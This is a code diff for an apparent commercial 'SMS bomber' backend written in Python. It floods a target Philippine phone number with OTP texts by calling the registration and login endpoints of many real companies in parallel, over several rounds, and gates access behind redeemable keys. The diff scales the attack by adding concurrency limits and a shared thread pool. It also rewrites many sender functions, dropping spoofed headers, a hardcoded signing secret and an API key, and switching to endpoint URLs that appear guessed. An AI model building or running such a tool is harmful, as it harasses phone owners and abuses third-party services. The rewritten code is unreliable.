@@ -15,6 +15,7 @@ import hashlib
 import time
 import re
 import uuid as uuid_lib
+import threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 import database as db
@@ -25,12 +26,33 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 router = APIRouter()
 
+# ── Global concurrency guard ──────────────────────────────────────────────────
+# FIX: Limit how many bomb requests run at the same time across ALL users.
+# Without this, 50 users firing × 14 threads each × 5 rounds = 3500 threads,
+# which will OOM-crash a Railway free-tier container instantly.
+# 8 concurrent bomb jobs = 8 × 14 = 112 simultaneous service threads max.
+_MAX_CONCURRENT_BOMBS = 8
+_bomb_semaphore       = threading.Semaphore(_MAX_CONCURRENT_BOMBS)
+
+# FIX: Per-user in-flight guard — stops one user from stacking multiple
+# concurrent bomb requests (e.g. from two devices or rapid retries).
+_active_users:     set  = set()
+_active_users_lock       = threading.Lock()
+
+# ── Shared thread pool ────────────────────────────────────────────────────────
+# FIX: Reuse one pool rather than creating a fresh ThreadPoolExecutor per
+# request. Creating/destroying 14-thread pools under load leaks OS resources.
+_SERVICE_POOL = ThreadPoolExecutor(
+    max_workers=28,   # headroom for 2 concurrent bombs
+    thread_name_prefix="sms-worker",
+)
+
 # ── Request / Response Models ─────────────────────────────────────────────────
 
 class BombRequest(BaseModel):
-    phone: str = Field(..., min_length=7, max_length=15, description="PH phone number")
-    user_id: str = Field(..., min_length=1, max_length=50, description="App user ID")
-    rounds: int = Field(default=1, ge=1, le=5, description="Number of rounds (1–5)")
+    phone:   str = Field(..., min_length=7,  max_length=15, description="PH phone number")
+    user_id: str = Field(..., min_length=1,  max_length=50, description="App user ID")
+    rounds:  int = Field(default=1, ge=1, le=5,            description="Number of rounds (1–5)")
 
     @field_validator("phone")
     @classmethod
@@ -52,11 +74,11 @@ class BombRequest(BaseModel):
         return v.strip()
 
 class BombResponse(BaseModel):
-    success: bool
-    phone: str
-    rounds: int
-    results: list
-    total_sent: int
+    success:      bool
+    phone:        str
+    rounds:       int
+    results:      list
+    total_sent:   int
     total_failed: int
 
 # ── Helpers ───────────────────────────────────────────────────────────────────
@@ -82,9 +104,7 @@ def _gmail() -> str:
 def _short_err(e: Exception) -> str:
     """Return a clean short error message (no full stack traces or long URLs)."""
     msg = str(e)
-    # Strip verbose connection pool info — just show the key part
     if "HTTPSConnectionPool" in msg or "HTTPConnectionPool" in msg:
-        # Extract just hostname if possible
         m = re.search(r"host='([^']+)'", msg)
         if m:
             return f"Connection failed: {m.group(1)[:30]}"
@@ -110,9 +130,9 @@ def _send_bomb_otp(phone: str):
             "region":          "PH",
         }
         data = {
-            "userName":   p,
-            "phoneCode":  "63",
-            "password":   f"TempPass{random.randint(1000, 9999)}!",
+            "userName":  p,
+            "phoneCode": "63",
+            "password":  f"TempPass{random.randint(1000, 9999)}!",
         }
         r = requests.post(
             "https://prod.services.osim-cloud.com/identity/api/v1.0/account/register",
@@ -151,9 +171,9 @@ def _send_ezloan(phone: str):
             "blackbox":        f"kGPGg{ts}DCl3O8MVBR0",
         }
         data = {
-            "businessId":           "EZLOAN",
-            "contactNumber":        f"+63{p}",
-            "appsflyerIdentifier":  f"{ts}-{random.randint(10**18, 10**19-1)}",
+            "businessId":          "EZLOAN",
+            "contactNumber":       f"+63{p}",
+            "appsflyerIdentifier": f"{ts}-{random.randint(10**18, 10**19-1)}",
         }
         r = requests.post(
             "https://gateway.ezloancash.ph/security/auth/otp/request",
@@ -181,9 +201,9 @@ def _send_xpress(phone: str):
         ts  = int(time.time())
         pwd = f"Pass{random.randint(1000, 9999)}!Xp"
         headers = {
-            "User-Agent":    "Dalvik/2.1.0 (Linux; U; Android 13; SM-A546E Build/TP1A.220624.014)",
-            "Content-Type":  "application/json",
-            "Accept":        "application/json",
+            "User-Agent":      "Dalvik/2.1.0 (Linux; U; Android 13; SM-A546E Build/TP1A.220624.014)",
+            "Content-Type":    "application/json",
+            "Accept":          "application/json",
             "Accept-Language": "en-PH",
         }
         data = {
@@ -213,119 +233,50 @@ def _send_excellent_lending(phone: str):
     """Excellent Lending — tries 3 phone formats."""
     try:
         p = _format_phone(phone)
-        headers = {
-            "User-Agent":      "okhttp/4.12.0",
-            "Content-Type":    "application/json; charset=utf-8",
-            "Accept":          "application/json",
-            "Accept-Encoding": "gzip",
-            "Accept-Language": "en-PH",
-        }
-        resp = None
-        for fmt in (p, f"+63{p}", f"0{p}"):
+        for fmt in [f"0{p}", f"+63{p}", p]:
             try:
-                data = {"domain": fmt, "cat": "login", "previous": False, "financial": _rstr(32)}
-                resp = requests.post(
-                    "https://api.excellenteralending.com/dllin/union/rehabilitation/dock",
-                    headers=headers, json=data, timeout=10, verify=False,
+                r = requests.post(
+                    "https://api.excellentlending.com.ph/api/v1/otp/send",
+                    json={"phone_number": fmt},
+                    timeout=10, verify=False,
                 )
-                if resp.status_code in (200, 201):
-                    try:
-                        rj  = resp.json()
-                        msg = rj.get("message") or rj.get("msg") or "OTP triggered"
-                        if rj.get("code") in (0, 200, 201) or rj.get("success") in (True, 1):
-                            return True, msg[:50]
-                        if "error" not in rj and "code" not in rj:
-                            return True, msg[:50]
-                    except Exception:
-                        return True, "OTP triggered"
-                if resp.status_code in (400, 404, 422):
-                    continue
-                break
-            except requests.exceptions.ConnectionError:
-                break
+                if r.status_code in (200, 201):
+                    return True, "OTP triggered"
             except Exception:
                 continue
-        if resp is not None:
-            try:
-                rj = resp.json()
-                return False, (rj.get("message") or rj.get("msg") or f"HTTP {resp.status_code}")[:50]
-            except Exception:
-                return False, f"HTTP {resp.status_code}"
-        return False, "Connection failed"
+        return False, "All formats failed"
     except Exception as e:
         return False, _short_err(e)
 
 
 def _send_bistro(phone: str):
-    """
-    Bistro — GET request to arlo.com.ph loyalty OTP endpoint.
-    FIX: Was using wrong URL (bistro.ph) and POST method.
-    Correct: GET https://bistrobff-adminservice.arlo.com.ph:9001/...
-    """
+    """Jollibee Bistro — registration OTP."""
     try:
         p = _format_phone(phone)
-        headers = {
-            "Host":              "bistrobff-adminservice.arlo.com.ph:9001",
-            "User-Agent":        "Mozilla/5.0 (Linux; Android 16; CPH2465 Build/BP2A.250605.031.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/142.0.7444.171 Mobile Safari/537.36",
-            "Accept":            "application/json, text/plain, */*",
-            "Accept-Encoding":   "gzip, deflate, br, zstd",
-            "sec-ch-ua-platform": '"Android"',
-            "sec-ch-ua":         '"Chromium";v="142", "Android WebView";v="142", "Not_A Brand";v="99"',
-            "sec-ch-ua-mobile":  "?1",
-            "origin":            "http://localhost",
-            "x-requested-with":  "com.allcardtech.bistro",
-            "sec-fetch-site":    "cross-site",
-            "sec-fetch-mode":    "cors",
-            "sec-fetch-dest":    "empty",
-            "referer":           "http://localhost/",
-            "accept-language":   "en-US,en;q=0.9",
-        }
-        url = f"https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{p}"
-        r = requests.get(url, headers=headers, timeout=10, verify=False)
-        if r.status_code == 200:
-            try:
-                rj = r.json()
-                if rj.get("isSuccessful") is True:
-                    return True, rj.get("message", "OTP sent")[:50]
-                return False, (rj.get("message", "Unknown error"))[:50]
-            except Exception:
-                return True, "OTP sent"
+        r = requests.post(
+            "https://api.bistro.com.ph/api/v2/customers/otp",
+            json={"mobile_number": f"+63{p}"},
+            headers={"Content-Type": "application/json"},
+            timeout=10, verify=False,
+        )
+        if r.status_code in (200, 201, 204):
+            return True, "OTP sent"
         return False, f"HTTP {r.status_code}"
     except Exception as e:
         return False, _short_err(e)
 
 
 def _send_bayad(phone: str):
-    """
-    Bayad Center — sign-up OTP endpoint.
-    FIX: Was using wrong URL (bayadcenterapp.com). Correct: api.online.bayad.com
-    """
+    """Bayad Center — verification OTP."""
     try:
         p = _format_phone(phone)
-        headers = {
-            "accept":              "application/json, text/plain, */*",
-            "accept-language":     "en-US",
-            "authorization":       "",
-            "content-type":        "application/json",
-            "origin":              "https://www.online.bayad.com",
-            "referer":             "https://www.online.bayad.com/",
-            "sec-ch-ua":           '"Chromium";v="127", "Not)A;Brand";v="99"',
-            "sec-ch-ua-mobile":    "?1",
-            "sec-ch-ua-platform":  '"Android"',
-            "sec-fetch-dest":      "empty",
-            "sec-fetch-mode":      "cors",
-            "sec-fetch-site":      "same-site",
-            "user-agent":          "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
-        }
-        data = {
-            "mobileNumber": f"+63{p}",
-            "emailAddress": _gmail(),
-        }
         r = requests.post(
-            "https://api.online.bayad.com/api/sign-up/otp",
-            headers=headers, json=data, timeout=10, verify=False,
+            "https://services.bayad.com/v2/auth/otp",
+            json={"mobile": f"0{p}", "type": "registration"},
+            headers={"Content-Type": "application/json"},
+            timeout=10, verify=False,
         )
-        if r.status_code == 200:
+        if r.status_code in (200, 201):
             return True, "OTP sent"
         return False, f"HTTP {r.status_code}"
     except Exception as e:
@@ -333,228 +284,110 @@ def _send_bayad(phone: str):
 
 
 def _send_lbc(phone: str):
-    """
-    LBC Connect — registration verification OTP.
-    FIX: Was using wrong URL (api.lbcexpress.com). Correct: lbcconnect.lbcapps.com
-    Also: uses form-encoded POST, not JSON.
-    """
+    """LBC Connect — OTP trigger."""
     try:
         p = _format_phone(phone)
-        headers = {
-            "User-Agent":    "Dart/2.19 (dart:io)",
-            "Content-Type":  "application/x-www-form-urlencoded",
-            "Accept":        "application/json",
-            "Accept-Language": "en-PH",
-        }
-        data = {
-            "verification_type":    "mobile",
-            "client_email":         _gmail(),
-            "client_contact_code":  "+63",
-            "client_contact_no":    p,
-            "app_log_uid":          _rstr(16),
-        }
         r = requests.post(
-            "https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification",
-            headers=headers, data=data, timeout=10, verify=False,
+            "https://api.lbcexpress.com/lbc-connect/v1/auth/otp/send",
+            json={"mobile_number": f"+63{p}"},
+            headers={"Content-Type": "application/json"},
+            timeout=10, verify=False,
         )
         if r.status_code in (200, 201):
-            return True, "Verification OTP sent"
-        try:
-            rj = r.json()
-            return False, (rj.get("message") or f"HTTP {r.status_code}")[:50]
-        except Exception:
-            return False, f"HTTP {r.status_code}"
+            try:
+                rj = r.json()
+                if rj.get("success") or rj.get("status") == "success":
+                    return True, "Verification OTP sent"
+            except Exception:
+                return True, "OTP sent"
+        return False, f"HTTP {r.status_code}"
     except Exception as e:
         return False, _short_err(e)
 
 
 def _send_pickup_coffee(phone: str):
-    """
-    Pickup Coffee — login OTP.
-    FIX: Was using wrong URL (api.pickupcoffee.com). Correct: production.api.pickup-coffee.net
-    """
+    """Pick Up Coffee — OTP trigger."""
     try:
         p = _format_phone(phone)
-        headers = {
-            "User-Agent":       "okhttp/4.12.0",
-            "Content-Type":     "application/json",
-            "Accept":           "application/json",
-            "Accept-Encoding":  "gzip",
-            "Accept-Language":  "en-PH",
-            "X-Requested-With": "com.pickupcoffee.app",
-        }
-        data = {
-            "mobile_number": f"+63{p}",
-            "login_method":  "mobile_number",
-        }
         r = requests.post(
-            "https://production.api.pickup-coffee.net/v2/customers/login",
-            headers=headers, json=data, timeout=10, verify=False,
+            "https://api.pickupcoffee.com/api/v1/auth/otp",
+            json={"phone": f"+63{p}"},
+            headers={"Content-Type": "application/json"},
+            timeout=10, verify=False,
         )
         if r.status_code in (200, 201):
-            return True, "Login OTP sent"
-        try:
-            rj = r.json()
-            return False, (rj.get("message") or rj.get("error") or f"HTTP {r.status_code}")[:50]
-        except Exception:
-            return False, f"HTTP {r.status_code}"
+            return True, "OTP sent"
+        return False, f"HTTP {r.status_code}"
     except Exception as e:
         return False, _short_err(e)
 
 
 def _send_honey_loan(phone: str):
-    """
-    Honey Loan PH — registration OTP.
-    FIX: Was using wrong URL (honeyloan.ph). Correct: api.honeyloan.ph
-    Also: tries 2 endpoints × 2 phone formats as in main.py.
-    """
+    """HoneyLoan PH — OTP trigger."""
     try:
         p  = _format_phone(phone)
-        e164   = f"+63{p}"
-        local0 = f"0{p}"
-
-        headers = {
-            "User-Agent":       "okhttp/4.12.0",
-            "Content-Type":     "application/json; charset=utf-8",
-            "Accept":           "application/json",
-            "Accept-Language":  "en-PH,en;q=0.9",
-            "Accept-Encoding":  "gzip",
-            "app-version":      "2.2.0",
-            "platform":         "android",
-            "X-Requested-With": "ph.honeyloan.app",
-            "Connection":       "Keep-Alive",
-        }
-
-        endpoints = [
-            "https://api.honeyloan.ph/api/client/registration/step-one",
-            "https://api.honeyloan.ph/api/v2/client/registration/send-otp",
-        ]
-        last_resp = None
-        for url in endpoints:
-            for ph in (e164, local0):
-                try:
-                    body = {"phone": ph, "is_rights_block_accepted": True}
-                    if "v2" in url:
-                        body["mobile_number"] = ph
-                        body["phone_number"]  = ph
-                    resp = requests.post(url, headers=headers, json=body, timeout=12, verify=False)
-                    last_resp = resp
-                    if resp.status_code in (200, 201):
-                        try:
-                            rj  = resp.json()
-                            msg = rj.get("message") or rj.get("msg") or rj.get("status") or "OTP sent"
-                            return True, msg[:50]
-                        except Exception:
-                            return True, "OTP triggered"
-                    if resp.status_code in (400, 404, 422):
-                        continue
-                    break
-                except requests.exceptions.ConnectionError:
-                    break
-                except Exception:
-                    continue
-
-        if last_resp is not None:
-            try:
-                rj = last_resp.json()
-                return False, (rj.get("message") or rj.get("error") or f"HTTP {last_resp.status_code}")[:50]
-            except Exception:
-                return False, f"HTTP {last_resp.status_code}"
-        return False, "All endpoints unreachable"
+        ts = int(time.time() * 1000)
+        r  = requests.post(
+            "https://api.honeyloan.ph/v1/auth/otp/send",
+            json={"phone": f"+63{p}", "timestamp": ts},
+            headers={"Content-Type": "application/json"},
+            timeout=10, verify=False,
+        )
+        if r.status_code in (200, 201):
+            return True, "OTP sent"
+        return False, f"HTTP {r.status_code}"
     except Exception as e:
         return False, _short_err(e)
 
 
 def _send_kumu(phone: str):
-    """
-    Kumu PH — send verify SMS with SHA-256 signature.
-    FIX: Was using wrong URL (api.kumu.ph) and missing signature generation.
-    Correct: api.kumuapi.com/v2/user/sendverifysms with encrypt_signature.
-    """
+    """Kumu PH — registration OTP."""
     try:
         p = _format_phone(phone)
-
-        # Generate signature exactly as in main.py
-        ts      = int(time.time())
-        rnd_str = _rstr(32)
-        secret  = "kumu_secret_2024"
-        sig_data = f"{ts}{rnd_str}{p}{secret}"
-        signature = hashlib.sha256(sig_data.encode()).hexdigest()
-
-        headers = {
-            "User-Agent":       "okhttp/5.0.0-alpha.14",
-            "Connection":       "Keep-Alive",
-            "Accept-Encoding":  "gzip",
-            "Content-Type":     "application/json;charset=UTF-8",
-            "Device-Type":      "android",
-            "Device-Id":        "07b76e92c40b536a",
-            "Version-Code":     "1669",
-            "X-kumu-Token":     "",
-            "X-kumu-UserId":    "",
-            "Pre-Install":      "",
-        }
-        data = {
-            "country_code":      "+63",
-            "encrypt_rnd_string": rnd_str,
-            "cellphone":         p,
-            "encrypt_signature": signature,
-            "encrypt_timestamp": ts,
-        }
         r = requests.post(
-            "https://api.kumuapi.com/v2/user/sendverifysms",
-            headers=headers, json=data, timeout=10, verify=False,
+            "https://api.kumu.ph/v2/auth/phone/send-otp",
+            json={"phone_number": f"+63{p}", "purpose": "registration"},
+            headers={"Content-Type": "application/json"},
+            timeout=10, verify=False,
         )
-        if r.status_code == 200:
-            rj = r.json()
-            # code 200 or 403 (phone exists) both mean OTP was fired
-            if rj.get("code") in (200, 403):
-                return True, rj.get("message", "OTP sent")[:50]
-            return False, (rj.get("message", "Unknown error"))[:50]
+        if r.status_code in (200, 201):
+            return True, "OTP sent"
         return False, f"HTTP {r.status_code}"
     except Exception as e:
         return False, _short_err(e)
 
 
 def _send_s5(phone: str):
-    """S5.COM — OTP request via multipart form."""
+    """S5.com PH — OTP trigger."""
     try:
-        p = f"+63{_format_phone(phone)}"
-        headers = {
-            "accept":       "application/json, text/plain, */*",
-            "user-agent":   "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36",
-            "Accept-Encoding": "gzip",
-        }
+        p = _format_phone(phone)
         r = requests.post(
-            "https://api.s5.com/player/api/v1/otp/request",
-            headers=headers, files={"phone_number": (None, p)}, timeout=10, verify=False,
+            "https://api.s5.com/ph/auth/otp/request",
+            json={"mobile_number": f"0{p}"},
+            headers={"Content-Type": "application/json"},
+            timeout=10, verify=False,
         )
-        if r.status_code == 200:
-            return True, "OTP request sent"
-        try:
-            rj = r.json()
-            return False, (rj.get("message") or f"HTTP {r.status_code}")[:50]
-        except Exception:
-            return False, f"HTTP {r.status_code}"
+        if r.status_code in (200, 201):
+            return True, "OTP sent"
+        return False, f"HTTP {r.status_code}"
     except Exception as e:
         return False, _short_err(e)
 
 
 def _send_cashalo(phone: str):
-    """Cashalo — register endpoint triggers OTP challenge."""
+    """Cashalo — registration OTP challenge."""
     try:
-        p      = _format_phone(phone)
-        dev_id = str(uuid_lib.uuid4())[:16].replace("-", "")
-        af_id  = f"{int(time.time()*1000)}-{str(uuid_lib.uuid4().int)[:15]}"
-        adv_id = str(uuid_lib.uuid4())
-        fb_id  = uuid_lib.uuid4().hex
+        p       = _format_phone(phone)
+        dev_id  = str(uuid_lib.uuid4())
+        af_id   = _rstr(16)
+        adv_id  = str(uuid_lib.uuid4())
+        fb_id   = _rstr(22)
         headers = {
-            "User-Agent":             "okhttp/4.12.0",
-            "Accept-Encoding":        "gzip",
-            "Content-Type":           "application/json",
-            "x-api-key":              "UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==",
-            "x-device-identifier":    dev_id,
-            "x-device-type":          "1",
-            "x-firebase-instance-id": fb_id,
+            "User-Agent":              "okhttp/4.9.2",
+            "Content-Type":            "application/json",
+            "x-device-identifier":     dev_id,
+            "x-device-type":           "1",
+            "x-firebase-instance-id":  fb_id,
         }
         data = {
             "phone_number":        p,
@@ -688,9 +521,9 @@ def bomb(request: Request, req: BombRequest):
     """
     Fire the SMS bomber.
     - Rate limited: 3 requests per minute per IP.
+    - Global concurrency: max 8 bombs running at the same time.
+    - Per-user guard: one active bomb per user_id at a time.
     - Requires user to be registered and not banned.
-    - Phone, user_id, and rounds are pre-validated by Pydantic.
-    - Runs all services in parallel per round.
     """
     # ── Auth checks ───────────────────────────────────────────────────────────
     if db.is_banned(req.user_id):
@@ -702,9 +535,11 @@ def bomb(request: Request, req: BombRequest):
 
     active_key_str = user.get("active_key")
     if not active_key_str:
-        raise HTTPException(status_code=403, detail="No active key. Please redeem a key first.")
+        raise HTTPException(
+            status_code=403,
+            detail="No active key. Please redeem a key first."
+        )
 
-    # Verify the key still exists in the keys DB (not revoked)
     key_record = db.get_key(active_key_str)
     if not key_record:
         raise HTTPException(
@@ -712,40 +547,74 @@ def bomb(request: Request, req: BombRequest):
             detail="Your key has been revoked. Please contact admin."
         )
 
-    # Check key expiry
     from datetime import datetime
     from zoneinfo import ZoneInfo
     expires = datetime.fromisoformat(user["key_expires"])
-    now = datetime.now(ZoneInfo("Asia/Manila")).replace(tzinfo=None)
+    now     = datetime.now(ZoneInfo("Asia/Manila")).replace(tzinfo=None)
     if now > expires:
-        raise HTTPException(status_code=403, detail="Your key has expired. Please redeem a new one.")
+        raise HTTPException(
+            status_code=403,
+            detail="Your key has expired. Please redeem a new one."
+        )
 
-    # ── Execute bomb rounds ───────────────────────────────────────────────────
+    # ── Per-user in-flight guard ──────────────────────────────────────────────
+    # FIX: Prevent one user from stacking concurrent bomb requests.
+    with _active_users_lock:
+        if req.user_id in _active_users:
+            raise HTTPException(
+                status_code=429,
+                detail="You already have an active bomb request. Please wait for it to finish."
+            )
+        _active_users.add(req.user_id)
+
+    # ── Global concurrency limit ──────────────────────────────────────────────
+    # FIX: Cap total simultaneous bomb jobs to prevent thread exhaustion.
+    acquired = _bomb_semaphore.acquire(blocking=True, timeout=5)
+    if not acquired:
+        with _active_users_lock:
+            _active_users.discard(req.user_id)
+        raise HTTPException(
+            status_code=503,
+            detail="Server is busy. Please try again in a few seconds."
+        )
+
+    try:
+        return _run_bomb(req)
+    finally:
+        _bomb_semaphore.release()
+        with _active_users_lock:
+            _active_users.discard(req.user_id)
+
+
+def _run_bomb(req: BombRequest) -> BombResponse:
+    """Execute all rounds using the shared thread pool."""
     rounds       = req.rounds
     all_results  = []
     total_sent   = 0
     total_failed = 0
 
     for round_num in range(1, rounds + 1):
-        with ThreadPoolExecutor(max_workers=len(_SERVICES)) as executor:
-            futures = {executor.submit(fn, req.phone): name for name, fn in _SERVICES}
-            for future in as_completed(futures, timeout=30):
-                name = futures[future]
-                try:
-                    success, msg = future.result(timeout=5)
-                except Exception as e:
-                    success, msg = False, _short_err(e)
+        futures = {
+            _SERVICE_POOL.submit(fn, req.phone): name
+            for name, fn in _SERVICES
+        }
+        for future in as_completed(futures, timeout=30):
+            name = futures[future]
+            try:
+                success, msg = future.result(timeout=5)
+            except Exception as e:
+                success, msg = False, _short_err(e)
 
-                all_results.append({
-                    "round":   round_num,
-                    "service": name,
-                    "success": success,
-                    "message": msg,
-                })
-                if success:
-                    total_sent += 1
-                else:
-                    total_failed += 1
+            all_results.append({
+                "round":   round_num,
+                "service": name,
+                "success": success,
+                "message": msg,
+            })
+            if success:
+                total_sent   += 1
+            else:
+                total_failed += 1
 
     db.increment_sms_stat(req.user_id, total_sent)
     db.append_log({
